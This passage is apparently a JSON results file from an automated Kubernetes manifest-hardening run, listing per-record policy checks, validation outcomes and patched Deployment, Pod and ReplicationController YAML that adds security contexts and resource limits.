    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01589",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01590",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01591",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01592",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01593",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01594",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01595",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01596",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01597",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause:stable\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  initContainers:\n  - image: k8s.gcr.io/pause:stable\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  securityContext:\n    runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01598",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01599",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01600",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01601",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01602",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01603",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01604",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01605",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The StatefulSet \"nexus3\" is invalid: \n* spec.template.spec.containers[0].volumeMounts[0].name: Not found: \"nexus-data\"\n* spec.template.spec.initContainers[0].volumeMounts[0].name: Not found: \"nexus-data\""
    ]
  },
  {
    "id": "01606",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01607",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01608",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01609",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01610",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-core\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/version: 1.4.0\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon1\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/version: v0.5\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon1\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/version: v0.5\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=8443\n        - --create-resources=$(MANAGER_CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: RELATED_IMAGE_STORAGE_INITIALIZER\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_REST\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TENSORFLOW\n          value: ''\n        - name: RELATED_IMAGE_EXPLAINER\n          value: ''\n        - name: RELATED_IMAGE_MOCK_CLASSIFIER\n          value: ''\n        - name: MANAGER_CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/engine:1.4.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          valueFrom:\n            secretKeyRef:\n              name: seldon-webhook-server-cert\n              key: predictive_unit_default_env_secret_ref_name\n        - name: PREDICTIVE_UNIT_METRICS_PORT_NAME\n          value: metrics\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: 